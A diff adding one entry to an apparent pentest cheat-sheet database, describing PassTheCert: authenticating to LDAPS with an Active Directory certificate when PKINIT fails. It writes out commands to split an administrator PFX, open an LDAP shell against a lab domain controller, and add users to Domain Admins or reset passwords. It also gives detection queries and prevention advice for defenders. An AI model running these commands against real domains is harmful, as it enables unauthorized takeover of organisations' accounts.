@@ -1,0 +1,102 @@
+{
+  "id": "ad-passthecert",
+  "name": "PassTheCert (Certificate-Based LDAP Shell)",
+  "command": "python3 passthecert.py -action ldap-shell -crt <cert_file>.crt -key <key_file>.key -domain <domain> -dc-ip <dc_ip>",
+  "description": "When you have a certificate (PFX/CRT+KEY) but PKINIT authentication fails (e.g. the cert lacks Client Authentication EKU, or the KDC rejects it), PassTheCert authenticates to LDAP using the certificate via Schannel/LDAPS. This gives you an interactive LDAP shell where you can add users to groups, reset passwords, or perform any LDAP operation as the certificate's identity.",
+  "platform": "linux",
+  "type": "command",
+  "opsec": "moderate",
+  "category": "Active Directory",
+  "subcategory": "ADCS Attacks",
+  "certifications": [
+    "CRTP",
+    "CPTS"
+  ],
+  "primary_cert": "CRTP",
+  "source": "HTB TombWatcher engagement; AlmondOffSec PassTheCert",
+  "tags": [
+    "adcs",
+    "passthecert",
+    "certificate",
+    "ldap-shell",
+    "schannel",
+    "pkinit-bypass"
+  ],
+  "mitre": [
+    "T1649"
+  ],
+  "exam": "exam-ok",
+  "notes": "=== THE IDEA ===\nPKINIT (Kerberos) requires the cert to have Client Authentication EKU.\nIf it only has Server Authentication (e.g. from ESC15/WebServer template),\ncertipy-ad auth will fail. PassTheCert bypasses this by authenticating\nto LDAP over TLS (Schannel) where EKU is not enforced the same way.\n\n=== SPLIT PFX INTO CRT + KEY ===\n  certipy-ad cert -pfx administrator.pfx -nokey -out administrator.crt\n  certipy-ad cert -pfx administrator.pfx -nocert -out administrator.key\n\n=== LAUNCH LDAP SHELL ===\n  python3 passthecert.py -action ldap-shell \\\n    -crt administrator.crt -key administrator.key \\\n    -domain <domain> -dc-ip <dc_ip>\n\n=== LDAP SHELL COMMANDS ===\n  add_user_to_group <user> Administrators\n  add_user_to_group <user> 'Domain Admins'\n  set_password <user> <new_password>\n  add_computer <computer_name>\n  del_computer <computer_name>\n\n=== ALTERNATIVE ACTIONS ===\n  -action modify-user  (set a UPN for S4U2Self)\n  -action add-computer (add a machine account)\n  -action whoami       (verify the authenticated identity)\n\n=== INSTALL ===\n  git clone https://github.com/AlmondOffSec/PassTheCert.git\n  cd PassTheCert/Python",
+  "examples": [
+    {
+      "label": "Split PFX into cert and key",
+      "command": "certipy-ad cert -pfx administrator.pfx -nokey -out administrator.crt && certipy-ad cert -pfx administrator.pfx -nocert -out administrator.key"
+    },
+    {
+      "label": "LDAP shell with certificate",
+      "command": "python3 passthecert.py -action ldap-shell -crt administrator.crt -key administrator.key -domain tombwatcher.htb -dc-ip 10.129.232.167"
+    },
+    {
+      "label": "Add user to Domain Admins via LDAP shell",
+      "command": "add_user_to_group john 'Domain Admins'"
+    }
+  ],
+  "references": [
+    {
+      "title": "PassTheCert - AlmondOffSec",
+      "url": "https://github.com/AlmondOffSec/PassTheCert"
+    },
+    {
+      "title": "The Hacker Recipes - PassTheCert",
+      "url": "https://www.thehacker.recipes/ad/movement/kerberos/pass-the-certificate"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "ad-esc15-ekuwu",
+      "note": "ESC15 gets you the certificate; PassTheCert uses it when PKINIT fails.",
+      "rel": "prereq"
+    },
+    {
+      "id": "ad-certipy-toolkit",
+      "note": "certipy-ad cert splits the PFX; certipy-ad auth is the first attempt before falling back to PassTheCert.",
+      "rel": "prereq"
+    }
+  ],
+  "defense": {
+    "why_it_works": "Schannel (TLS client certificate authentication to LDAP) does not enforce EKU restrictions the same way PKINIT does. A certificate with only Server Authentication EKU can still authenticate to LDAPS, granting the attacker an LDAP session as the certificate's subject.",
+    "prerequisites": "A valid certificate (PFX or CRT+KEY) issued by the domain's CA, even without Client Authentication EKU; LDAPS must be available (port 636).",
+    "impact": "Authenticated LDAP session as the certificate's identity - can modify group membership, reset passwords, add computers.",
+    "detection": "[MITRE T1649] LDAPS connection using certificate authentication (Event 4624 with AuthPackage=Schannel); Group membership changes (4728/4756) shortly after.",
+    "artifacts": "4624 Schannel logon event; 4728/4756 group membership changes; CRT and KEY files on attacker disk.",
+    "splunk_spl": "index=wineventlog sourcetype=\"WinEventLog:Security\" EventCode=4624 AuthenticationPackageName=\"Schannel\"\n| table _time, TargetUserName, IpAddress, CertificateIssuerName",
+    "elastic_kql": "event.code:\"4624\" AND winlog.event_data.AuthenticationPackageName:\"Schannel\"",
+    "sentinel_kql": "SecurityEvent\n| where EventID == 4624 and AuthenticationPackageName == \"Schannel\"\n| project TimeGenerated, Account=TargetUserName, IpAddress, CertIssuer=CertificateIssuerName",
+    "sigma_rules": "win_security_schannel_certificate_logon",
+    "prevention": "Disable LDAPS if not required; monitor Schannel logon events; require Client Authentication EKU in all user-facing templates; patch vulnerable templates.",
+    "sources": [
+      "HTB TombWatcher",
+      "https://attack.mitre.org/techniques/T1649/"
+    ],
+    "detections": [
+      {
+        "platform": "sentinel",
+        "name": "Schannel certificate authentication to LDAP",
+        "logic": "SecurityEvent\n| where EventID == 4624 and AuthenticationPackageName == \"Schannel\"\n| project TimeGenerated, Account=TargetUserName, IpAddress, CertIssuer=CertificateIssuerName\n| join kind=leftouter (\n    SecurityEvent | where EventID in (4728, 4756)\n    | project GroupChangeTime=TimeGenerated, GroupName=TargetUserName, MemberAdded=MemberName\n) on $left.Account == $right.MemberAdded\n| sort by TimeGenerated desc",
+        "data_source": "windows-security",
+        "log_ids": [
+          "4624",
+          "4728",
+          "4756"
+        ],
+        "attack": [
+          "T1649"
+        ],
+        "fidelity": "behavioral",
+        "confidence": "high",
+        "false_positives": "Legitimate smart card or certificate-based LDAP authentication",
+        "tuning": "Alert when Schannel logon is followed by privileged group modification within 5 minutes"
+      }
+    ]
+  }
+}
